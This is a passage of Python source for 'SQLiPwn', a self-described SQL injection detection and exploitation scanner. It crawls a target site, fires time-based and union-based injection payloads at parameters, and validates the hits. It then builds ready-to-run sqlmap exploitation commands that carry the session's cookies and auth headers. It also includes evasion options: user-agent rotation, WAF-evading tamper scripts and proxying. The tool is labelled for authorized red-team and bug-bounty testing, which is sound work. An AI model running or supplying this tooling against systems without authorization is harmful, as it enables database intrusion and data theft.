                            error_message=f"Significant response delay detected: {delay_diff:.2f}s (baseline: {avg_baseline:.2f}s)",
                            sqlmap_command=self._generate_sqlmap_command(url, param, method),
                            confidence=confidence,
                            timestamp=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                            authenticated=self.auth_manager.is_authenticated if self.auth_manager else False
                        )
                
                except requests.exceptions.Timeout:
                    return VulnerableEndpoint(
                        url=url,
                        parameter=param,
                        method=method,
                        injection_type="Time-based Blind",
                        payload=payload,
                        response_time=15.0,
                        error_message="Request timeout occurred - strong indicator of time-based injection",
                        sqlmap_command=self._generate_sqlmap_command(url, param, method),
                        confidence="HIGH",  # Timeout is a strong indicator
                        timestamp=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                        authenticated=self.auth_manager.is_authenticated if self.auth_manager else False
                    )
                except Exception:
                    continue
        
        except Exception:
            pass
        
        return None
    
    def _test_union_based(self, url: str, param: str, method: str) -> Optional[VulnerableEndpoint]:

        for payload in self.payload_engine.union_payloads:
            try:
                start_time = time.time()
                response = self._make_request(url, param, payload, method)
                if not response:
                    continue
                    
                response_time = time.time() - start_time
                
                # union injection indicators
                union_indicators = [
                    (r'Column count doesn\'t match', 'HIGH'),
                    (r'The used SELECT statements have a different number of columns', 'HIGH'),
                    (r'All queries combined using a UNION.*must have the same number of columns', 'HIGH'),
                    (r'ORA-\d+.*UNION', 'HIGH'),
                    (r'Unknown column.*in.*order clause', 'MEDIUM'),
                    (r'Operand should contain.*column', 'MEDIUM'),
                    (r'ORDER BY position.*is not in select list', 'MEDIUM')
                ]
                
                for pattern, confidence in union_indicators:
                    matches = re.findall(pattern, response.text, re.IGNORECASE)
                    if matches:
                        error_context = self._extract_error_context(response.text, matches[0] if matches else pattern)
                        
                        return VulnerableEndpoint(
                            url=url,
                            parameter=param,
                            method=method,
                            injection_type="Union-based",
                            payload=payload,
                            response_time=response_time,
                            error_message=error_context,
                            sqlmap_command=self._generate_sqlmap_command(url, param, method),
                            confidence=confidence,
                            timestamp=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                            authenticated=self.auth_manager.is_authenticated if self.auth_manager else False
                        )
                
            except Exception:
                continue
        
        return None
    
    def _make_request(self, url: str, param: str, payload: str, method: str, timeout: int = None) -> Optional[requests.Response]:

        try:
            # Use instance timeout if not specified
            if timeout is None:
                timeout = self.timeout
            
            # Rotate user agent for each request if enabled
            if self.user_agent_manager:
                self.session.headers['User-Agent'] = self.user_agent_manager.get_rotating_user_agent()
            
            if method == 'GET':
                test_url = self._build_get_url(url, param, payload)
                return self.session.get(test_url, timeout=timeout, verify=False, allow_redirects=True)
            else:
                data = {param: payload}
                return self.session.post(url, data=data, timeout=timeout, verify=False, allow_redirects=True)
                
        except requests.exceptions.Timeout:
            raise  # Re-raise timeout for special handling
        except Exception as e:

            if "Connection refused" in str(e) or "Name resolution failed" in str(e):
                print(f"{Fore.YELLOW}[!] Connection error for {param}: {str(e)}")
            return None
    
    def _build_get_url(self, url: str, param: str, payload: str) -> str:

        try:

            encoded_payload = quote(payload, safe='')  # Encode everything
            separator = '&' if '?' in url else '?'
            return f"{url}{separator}{param}={encoded_payload}"
        except Exception:

            separator = '&' if '?' in url else '?'
            return f"{url}{separator}{param}={payload}"
    
    def _calculate_error_confidence(self, pattern: str, response_text: str) -> str:

        high_confidence_keywords = [
            'syntax', 'mysql_fetch', 'ora-', 'postgresql', 'sql server',
            'duplicate entry', 'unknown column', 'invalid input syntax'
        ]
        
        pattern_lower = pattern.lower()
        
        if any(keyword in pattern_lower for keyword in high_confidence_keywords):
            return "HIGH"
        elif 'error' in pattern_lower or 'warning' in pattern_lower:
            return "MEDIUM"
        else:
            return "LOW"
    
    def _extract_error_context(self, response_text: str, error_match: str) -> str:

        try:
            # Find the line containing the error
            lines = response_text.split('\n')
            error_line = None
            
            for line in lines:
                if error_match.lower() in line.lower():
                    error_line = line.strip()
                    break
            
            if error_line:
                # Truncate very long lines
                if len(error_line) > 200:
                    error_line = error_line[:200] + "..."
                return f"Database error detected: {error_line}"
            else:
                return f"Database error pattern matched: {error_match}"
                
        except Exception:
            return f"Database error detected: {error_match}"
    
    def _generate_sqlmap_command(self, url: str, param: str, method: str) -> str:

        base_cmd = ""
        
        # base command
        if method == 'GET':

            test_url = self._build_get_url(url, param, "INJECT")
            base_cmd = f'sqlmap -u "{test_url}"'
        else:
            # For POST, use --data parameter
            base_cmd = f'sqlmap -u "{url}" --data "{param}=INJECT"'
        
        # Add parameter specification
        base_cmd += f' -p "{param}"'
        
        # Add cookies if available
        if self.session.cookies:
            cookie_pairs = [f"{cookie.name}={cookie.value}" for cookie in self.session.cookies]
            cookie_string = "; ".join(cookie_pairs)
            if len(cookie_string) < 500:  # Avoid extremely long cookie strings
                base_cmd += f' --cookie="{cookie_string}"'
        
        # Add custom headers if available (focus on authentication headers)
        auth_headers = ['Authorization', 'X-API-Key', 'X-Auth-Token', 'X-Access-Token', 'Bearer']
        for header in auth_headers:
            if header in self.session.headers:
                header_value = self.session.headers[header]
                if len(header_value) < 200:  # Avoid extremely long headers
                    base_cmd += f' --header="{header}: {header_value}"'
        
        # Add optimized SQLMap options
        base_cmd += ' --batch --level=3 --risk=2 --threads=5 --timeout=10'
        
        # Add tamper scripts for WAF evasion if in thorough mode
        if self.payload_engine.thorough_mode:
            base_cmd += ' --tamper=between,randomcase,space2comment'
        
        return base_cmd
    
    def _get_confidence_score(self, confidence: str) -> int:

        return {'LOW': 1, 'MEDIUM': 2, 'HIGH': 3}.get(confidence, 0)

class VulnerabilityValidator:

    
    def __init__(self):
        self.false_positive_patterns = [
            # HTTP errors that aren't SQL injection
            r'404.*not found',
            r'403.*forbidden',
            r'500.*internal server error',
            r'502.*bad gateway',
            r'503.*service unavailable',
            r'504.*gateway timeout',
            
            # Rate limiting and protection
            r'rate limit',
            r'too many requests',
            r'cloudflare',
            r'access denied',
            

            r'maintenance mode',
            r'site under maintenance',
            r'temporarily unavailable',
            
            # False positive
            r'page not found',
            r'file not found',
            r'invalid request',
            r'bad request'
        ]
        
        # Patterns that suggest legitimate SQL injection
        self.true_positive_patterns = [
            r'mysql_.*error',
            r'ora-\d{5}',
            r'postgresql.*error',
            r'syntax error.*sql',
            r'column.*does not exist',
            r'table.*does not exist',
            r'unknown column',
            r'duplicate entry'
        ]
    
    def validate(self, vulnerability: VulnerableEndpoint) -> bool:

        error_msg = vulnerability.error_message.lower()
        

        for pattern in self.false_positive_patterns:
            if re.search(pattern, error_msg, re.IGNORECASE):
                return False
        

        true_positive_score = 0
        for pattern in self.true_positive_patterns:
            if re.search(pattern, error_msg, re.IGNORECASE):
                true_positive_score += 1
        

        if vulnerability.injection_type.startswith("Time-based"):
            return self._validate_time_based(vulnerability)
        elif vulnerability.injection_type.startswith("Boolean-based"):
            return self._validate_boolean_based(vulnerability)
        elif vulnerability.injection_type.startswith("Error-based"):
            return self._validate_error_based(vulnerability, true_positive_score)
        elif vulnerability.injection_type.startswith("Union-based"):
            return self._validate_union_based(vulnerability)
        
        return True
    
    def _validate_time_based(self, vuln: VulnerableEndpoint) -> bool:


        return vuln.response_time >= 3.0
    
    def _validate_boolean_based(self, vuln: VulnerableEndpoint) -> bool:

        if "Response length difference:" in vuln.error_message:
            try:
                # Extract the length difference
                diff_match = re.search(r'Length: (\d+) bytes', vuln.error_message)
                if diff_match:
                    diff = int(diff_match.group(1))
                    return diff >= 50  # Require at least 50 bytes difference
                

                diff = float(vuln.error_message.split(":")[1].strip().split()[0])
                return diff >= 50
            except:
                return False
        

        if "Status: True" in vuln.error_message:
            return True
            
        return False
    
    def _validate_error_based(self, vuln: VulnerableEndpoint, true_positive_score: int) -> bool:

        error_msg = vuln.error_message.lower()
        

        sql_keywords = ['syntax', 'mysql', 'postgresql', 'oracle', 'sql server', 'column', 'table', 'query']
        sql_score = sum(1 for keyword in sql_keywords if keyword in error_msg)
        

        return true_positive_score > 0 or sql_score >= 2
    
    def _validate_union_based(self, vuln: VulnerableEndpoint) -> bool:

        error_msg = vuln.error_message.lower()
        
        # Union-based should have specific error patterns
        union_keywords = ['column count', 'union', 'select', 'operand should contain']
        return any(keyword in error_msg for keyword in union_keywords)

class SQLiPwnScanner:

    
    def __init__(self, target_url: str, max_depth: int = 3, threads: int = 10, 
                 delay: float = 0.5, timeout: int = 10, cookies: str = None, 
                 headers: Dict[str, str] = None, auth_test: bool = False,
                 fast_mode: bool = False, thorough_mode: bool = False, 
                 random_user_agent: bool = False, proxy: str = None):
        
        self.target_url = target_url
        self.max_depth = max_depth
        self.threads = threads
        self.delay = delay
        self.timeout = timeout
        self.auth_test = auth_test
        self.proxy = proxy
        
        # Initialize user agent manager
        self.user_agent_manager = UserAgentManager() if random_user_agent else None
        
        # Initialize core components
        self.payload_engine = PayloadEngine(fast_mode, thorough_mode)
        self.auth_manager = AuthenticationManager(requests.Session())
        self.validator = VulnerabilityValidator()
        self.reporter = ReportGenerator(target_url)
        
        # Setup authentication
        if cookies:
            auth_setup_success = self.auth_manager.setup_cookies(cookies)
            if auth_setup_success and auth_test:
                self.auth_manager.test_authentication(target_url)
        

        self.crawler = WebCrawler(
            target_url, max_depth, delay, 100, 
            self.auth_manager, headers, self.user_agent_manager, proxy
        )
        self.tester = InjectionTester(
            self.payload_engine, self.auth_manager, timeout, 
            headers, self.user_agent_manager, proxy
        )
    
    def scan(self):

        print(f"{Fore.GREEN}{'='*80}")
        print(f"{Fore.GREEN}SQLiPwn - Advanced SQL Injection Security Scanner v2.1")
        print(f"{Fore.GREEN}Professional SQL injection detection and exploitation tool")
        print(f"{Fore.GREEN}Created by: syfi")
        print(f"{Fore.GREEN}{'='*80}")
        print(f"{Fore.GREEN}Target: {self.target_url}")
        print(f"{Fore.GREEN}Configuration:")
        print(f"{Fore.GREEN}  - Crawl Depth: {self.max_depth}")
        print(f"{Fore.GREEN}  - Threads: {self.threads}")
        print(f"{Fore.GREEN}  - Request Delay: {self.delay}s")
        print(f"{Fore.GREEN}  - Request Timeout: {self.timeout}s")
        
        # authentication status display
        auth_summary = {'cookie_count': len(self.auth_manager.session.cookies)}
        if auth_summary['cookie_count'] > 0:
            conf_str = f"({self.auth_manager.auth_confidence}% confidence)" if hasattr(self.auth_manager, 'auth_confidence') else ""
            print(f"{Fore.GREEN}  - Authentication: {auth_summary['cookie_count']} cookies loaded {conf_str}")
        else:
            print(f"{Fore.YELLOW}  - Authentication: Unauthenticated scan")
        
        # feature status display
        if self.user_agent_manager:
            print(f"{Fore.GREEN}  - User Agent: Random rotation ({len(self.user_agent_manager.user_agents)} agents)")
        else:
            print(f"{Fore.YELLOW}  - User Agent: Static")
        
        if self.proxy:
            print(f"{Fore.GREEN}  - Proxy: {self.proxy}")
        else:
            print(f"{Fore.YELLOW}  - Proxy: Direct connection")
        
        # Scan mode information
        if self.payload_engine.fast_mode:
            print(f"{Fore.CYAN}  - Scan Mode: Fast (reduced payloads for speed)")
        elif self.payload_engine.thorough_mode:
            print(f"{Fore.CYAN}  - Scan Mode: Thorough (extended payloads + WAF evasion)")
        else:
            print(f"{Fore.CYAN}  - Scan Mode: Standard (balanced speed and coverage)")
        
        print(f"{Fore.GREEN}{'='*80}\n")
        
        scan_start_time = time.time()
        
        try:
            # Phase 1: web crawling
            print(f"{Fore.CYAN}[PHASE 1] Web crawling and parameter discovery...")
            crawl_start = time.time()
            parameters = self.crawler.crawl()
            crawl_duration = time.time() - crawl_start
            
            if not parameters:
                print(f"{Fore.RED}[!] No testable parameters found")
                print(f"{Fore.YELLOW}[*] Consider:")
                print(f"{Fore.YELLOW}    - Increasing crawl depth (--depth)")
                print(f"{Fore.YELLOW}    - Checking authentication (--auth-test)")
                print(f"{Fore.YELLOW}    - Verifying the target URL is accessible")
                return
            
            total_params = sum(len(p['GET']) + len(p['POST']) for p in parameters.values())
            print(f"{Fore.GREEN}[+] Discovery completed in {crawl_duration:.1f}s:")
            print(f"{Fore.GREEN}    - {len(parameters)} endpoints discovered")
            print(f"{Fore.GREEN}    - {total_params} parameters identified for testing")
            

            self.reporter.scan_stats['urls_crawled'] = len(parameters)
            self.reporter.scan_stats['parameters_tested'] = total_params
            
            # Phase 2: SQL injection vulnerability testing
            print(f"\n{Fore.CYAN}[PHASE 2] SQL injection vulnerability testing...")
            test_start = time.time()
            

            total_endpoints = len(parameters)
            completed_endpoints = 0
            
            with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:

                future_to_endpoint = {
                    executor.submit(self._test_endpoint_with_progress, url, params, i+1, total_endpoints): (url, params)
                    for i, (url, params) in enumerate(parameters.items())
                }
                

                for future in concurrent.futures.as_completed(future_to_endpoint):
                    url, params = future_to_endpoint[future]
                    completed_endpoints += 1
                    
                    try:
                        vulnerabilities = future.result()
                        validated_vulns = 0
                        
                        for vuln in vulnerabilities:
                            if self.validator.validate(vuln):
                                self.reporter.add_vulnerability(vuln)
                                validated_vulns += 1
                        
                        # progress display
                        progress = (completed_endpoints / total_endpoints) * 100
                        if validated_vulns > 0:
                            print(f"{Fore.GREEN}[+] Progress: {progress:.1f}% ({completed_endpoints}/{total_endpoints}) - {validated_vulns} vulnerabilities found in {url}")
                        else:
                            print(f"{Fore.CYAN}[*] Progress: {progress:.1f}% ({completed_endpoints}/{total_endpoints}) - {url}")
                        
                    except Exception as e:
                        print(f"{Fore.RED}[!] Error testing {url}: {str(e)}")
            
            test_duration = time.time() - test_start
            print(f"{Fore.GREEN}[+] Vulnerability testing completed in {test_duration:.1f}s")
            
            # Phase 3:  reporting
            print(f"\n{Fore.CYAN}[PHASE 3] Generating comprehensive reports...")
            
            # Display summary
            self.reporter.display_summary()
            
            # Generate HTML report by default
            html_file = self.reporter.generate_html_report()
            
            # total scan time
            total_scan_time = time.time() - scan_start_time
            

            print(f"\n{Fore.GREEN}{'='*80}")
            print(f"{Fore.GREEN}SCAN COMPLETED SUCCESSFULLY")
            print(f"{Fore.GREEN}{'='*80}")
            print(f"{Fore.GREEN}Total Scan Time: {total_scan_time:.1f} seconds")
            print(f"{Fore.GREEN}HTML Dashboard: {html_file}")
            print(f"{Fore.GREEN}Tool: SQLiPwn by syfi")
            

            vuln_count = len(self.reporter.vulnerabilities)
            high_risk = len([v for v in self.reporter.vulnerabilities if v.confidence == 'HIGH'])
            
            if vuln_count > 0:
                print(f"\n{Fore.RED}{'='*80}")
                print(f"{Fore.RED}SECURITY ALERT: {vuln_count} SQL INJECTION VULNERABILITIES DETECTED!")
                if high_risk > 0:
                    print(f"{Fore.RED}CRITICAL: {high_risk} HIGH CONFIDENCE vulnerabilities require immediate attention!")
                print(f"{Fore.RED}{'='*80}")
                
                print(f"\n{Fore.YELLOW}RECOMMENDED ACTIONS:")
                print(f"{Fore.YELLOW}1. Review the HTML report for detailed vulnerability information")
                print(f"{Fore.YELLOW}2. Use the provided SQLMap commands for further exploitation testing")
            else:
                print(f"\n{Fore.GREEN}{'='*60}")
                print(f"{Fore.GREEN}SECURITY STATUS: No SQL injection vulnerabilities detected!")
                print(f"{Fore.GREEN}The application appears to be protected against SQL injection.")
                print(f"{Fore.GREEN}{'='*60}")
        
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Scan interrupted by user")
            print(f"{Fore.CYAN}[*] Generating report with partial results...")
            if self.reporter.vulnerabilities:
                html_file = self.reporter.generate_html_report()
                print(f"{Fore.GREEN}[+] Partial report generated: {html_file}")
        except Exception as e:
            print(f"\n{Fore.RED}[!] Critical error during scan: {str(e)}")
            print(f"{Fore.CYAN}[*] Attempting to generate report with partial results...")
            try:
                if self.reporter.vulnerabilities:
                    html_file = self.reporter.generate_html_report()
                    print(f"{Fore.GREEN}[+] Partial report generated: {html_file}")
            except:
                pass
    
    def _test_endpoint_with_progress(self, url: str, params: Dict[str, List[str]], endpoint_num: int, total_endpoints: int) -> List[VulnerableEndpoint]:

        try:
            return self.tester.test_endpoint(url, params)
        except Exception as e:
            print(f"{Fore.RED}[!] Error testing endpoint {endpoint_num}/{total_endpoints} ({url}): {str(e)}")
            return []

def print_sqlipwn_banner():
    banner = f"""
{Fore.RED}   ____   ___  _     _   ____                  
{Fore.RED}  / ___| / _ \\| |   (_) |  _ \\ __      ___ __   
{Fore.RED}  \\___ \\| | | | |   | | | |_) |\\ \\ /\\ / / '_ \\  
{Fore.RED}   ___) | |_| | |___| | |  __/  \\ V  V /| | | | 
{Fore.RED}  |____/ \\___/|_____|_| |_|     \\_/\\_/ |_| |_| 
{Fore.RED}                                               
{Fore.RED}  SQLiPwn - Advanced SQL Injection Scanner v2.1
{Fore.RED}  SQL injection detection and exploitation
{Fore.RED}  Multi-threading | Authentication | Professional Reports
{Fore.CYAN}  
{Fore.CYAN}  Created by: syfi
{Fore.CYAN}  Optimized for Red Team & Bug Bounty operations
{Style.RESET_ALL}
    """
    print(banner)

def main():
    
    print_sqlipwn_banner()
    
    parser = argparse.ArgumentParser(
        description="SQLiPwn - Advanced SQL Injection Scanner v2.1 by syfi",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
USAGE EXAMPLES:
  Basic scan:
    python sqlipwn.py -u https://example.com

  Fast scan (reduced payloads):
    python sqlipwn.py -u https://example.com --fast

  Authenticated scan with session cookies:
    python sqlipwn.py -u https://app.com --cookies "session=abc123; token=xyz789"

  Thorough scan with WAF evasion and Burp Suite proxy:
    python sqlipwn.py -u https://example.com --thorough --random-user-agent --proxy http://127.0.0.1:8080

  Deep crawl with custom headers:
    python sqlipwn.py -u https://api.example.com -d 5 --headers "Authorization: Bearer token123"

  Multi-threaded scan with custom timing:
    python sqlipwn.py -u https://example.com -t 20 --delay 0.2 --timeout 15

SCAN MODES:
  --fast      : Reduced payloads for speed (recommended for time-limited scans)
  --thorough  : Extended payloads + WAF evasion techniques (comprehensive testing)
  default     : Balanced approach (recommended for most scenarios)

AUTHENTICATION:
  --cookies          : Session cookies as string ("name=value; name2=value2")
  --cookie-file      : Load cookies from file (JSON or simple format)
  --auth-test        : Verify authentication is working before scanning

EVASION & PROXY:
  --random-user-agent: Rotate through different user agents
  --proxy            : Route through HTTP proxy (Burp Suite: http://127.0.0.1:8080)
  --headers          : Custom HTTP headers for API authentication

Created by syfi for authorized security testing
        """
    )
    
    # arguments
    parser.add_argument('-u', '--url', required=True, 
                       help='Target URL to scan (required)')
    parser.add_argument('-d', '--depth', type=int, default=3, 
                       help='Maximum crawl depth (default: 3)')
    parser.add_argument('-t', '--threads', type=int, default=10, 
                       help='Number of concurrent threads (default: 10, max: 50)')
    parser.add_argument('--delay', type=float, default=0.5, 
                       help='Delay between requests in seconds (default: 0.5)')
    parser.add_argument('--timeout', type=int, default=10, 
                       help='HTTP request timeout in seconds (default: 10)')
    
    # Authentication options
    auth_group = parser.add_argument_group('Authentication Options')
    auth_group.add_argument('--cookies', 
                           help='Session cookies ("name1=value1; name2=value2")')
    auth_group.add_argument('--cookie-file', 
                           help='Path to cookie file (JSON, Netscape, or simple format)')
    auth_group.add_argument('--headers', 
                           help='Custom HTTP headers ("Header1: Value1; Header2: Value2")')
    auth_group.add_argument('--auth-test', action='store_true', 
                           help='Test authentication status before scanning')
    
    # Scan mode options
    scan_group = parser.add_argument_group('Scan Mode Options')
    scan_group.add_argument('--fast', action='store_true', 
                           help='Fast scan mode (reduced payloads for speed)')
    scan_group.add_argument('--thorough', action='store_true', 
                           help='Thorough scan mode (extended payloads + WAF evasion)')
    
    evasion_group = parser.add_argument_group('Evasion & Proxy Options')
    evasion_group.add_argument('--random-user-agent', action='store_true', 
                              help='Use random user agent rotation for evasion')
    evasion_group.add_argument('--proxy', 
                              help='HTTP proxy URL (e.g., http://127.0.0.1:8080 for Burp Suite)')
    
    args = parser.parse_args()
    
    if not args.url.startswith(('http://', 'https://')):
        print(f"{Fore.RED}[!] Error: URL must start with http:// or https://")
        print(f"{Fore.YELLOW}[*] Example: python sqlipwn.py -u https://example.com")
        sys.exit(1)
    
    if args.threads < 1 or args.threads > 50:
        print(f"{Fore.RED}[!] Error: Thread count must be between 1 and 50")
        print(f"{Fore.YELLOW}[*] Recommended: 5-20 threads depending on target capacity")
        sys.exit(1)
    
    if args.depth < 1 or args.depth > 10:
        print(f"{Fore.RED}[!] Error: Crawl depth must be between 1 and 10")
        sys.exit(1)
    
    if args.delay < 0 or args.delay > 10:
        print(f"{Fore.RED}[!] Error: Delay must be between 0 and 10 seconds")
        sys.exit(1)
    
    if args.fast and args.thorough:
        print(f"{Fore.RED}[!] Error: Cannot use both --fast and --thorough modes")
        print(f"{Fore.YELLOW}[*] Choose one mode or use default (balanced) mode")
        sys.exit(1)
    
    try:
        custom_headers = {}
        if args.headers:
            try:
                for header in args.headers.split(';'):
                    if ':' in header:
                        key, value = header.split(':', 1)
                        custom_headers[key.strip()] = value.strip()
                print(f"{Fore.GREEN}[+] Loaded {len(custom_headers)} custom headers")
            except Exception as e:
                print(f"{Fore.RED}[!] Error parsing headers: {e}")
                sys.exit(1)
        
        #  cookie source
        cookie_source = args.cookies or args.cookie_file
        
        # configuration display
        print(f"\n{Fore.CYAN}SCAN CONFIGURATION:")
        print(f"{Fore.CYAN}{'='*50}")
        print(f"{Fore.CYAN}Target URL      : {args.url}")
        print(f"{Fore.CYAN}Crawl Depth     : {args.depth} levels")
        print(f"{Fore.CYAN}Thread Count    : {args.threads}")
        print(f"{Fore.CYAN}Request Delay   : {args.delay}s")
        print(f"{Fore.CYAN}Request Timeout : {args.timeout}s")
        print(f"{Fore.CYAN}Authentication  : {'Configured' if cookie_source else 'None'}")
        print(f"{Fore.CYAN}Custom Headers  : {len(custom_headers) if custom_headers else 'None'}")
        print(f"{Fore.CYAN}User Agent      : {'Random Rotation' if args.random_user_agent else 'Static'}")
        print(f"{Fore.CYAN}Proxy           : {args.proxy if args.proxy else 'Direct Connection'}")
        
        if args.fast:
            print(f"{Fore.CYAN}Scan Mode       : Fast (optimized for speed)")
        elif args.thorough:
            print(f"{Fore.CYAN}Scan Mode       : Thorough (comprehensive + evasion)")
        else:
            print(f"{Fore.CYAN}Scan Mode       : Standard (balanced)")
        
        print(f"{Fore.CYAN}{'='*50}")
        
        if args.thorough and args.threads > 20:
            response = input(f"\n{Fore.YELLOW}[?] High-intensity scan detected. Continue? (y/N): ")
            if response.lower() != 'y':
                print(f"{Fore.YELLOW}[*] Scan cancelled by user")
                sys.exit(0)
        
        scanner = SQLiPwnScanner(
            target_url=args.url,
            max_depth=args.depth,
            threads=args.threads,
            delay=args.delay,
            timeout=args.timeout,
            cookies=cookie_source,
            headers=custom_headers if custom_headers else None,
            auth_test=args.auth_test,
            fast_mode=args.fast,
            thorough_mode=args.thorough,
            random_user_agent=args.random_user_agent,
            proxy=args.proxy
        )
        
        # Execute scan with enhanced error handling
        print(f"\n{Fore.GREEN}[*] Initializing SQLiPwn scanner...")
        print(f"{Fore.GREEN}[*] Target acquired: {args.url}")
        print(f"{Fore.GREEN}[*] Beginning security assessment...\n")
        
        scanner.scan()
        
        print(f"\n{Fore.GREEN}[+] SQLiPwn scan completed successfully!")
        print(f"{Fore.CYAN}[*] x.com/syfi2k")
        
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Scan interrupted by user")
        print(f"{Fore.CYAN}[*] Cleaning up and exiting...")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Fore.RED}[!] Critical Error: {str(e)}")
        print(f"{Fore.YELLOW}[*] If this error persists, please report it to syfi")
        sys.exit(1)

if __name__ == "__main__":
    main()
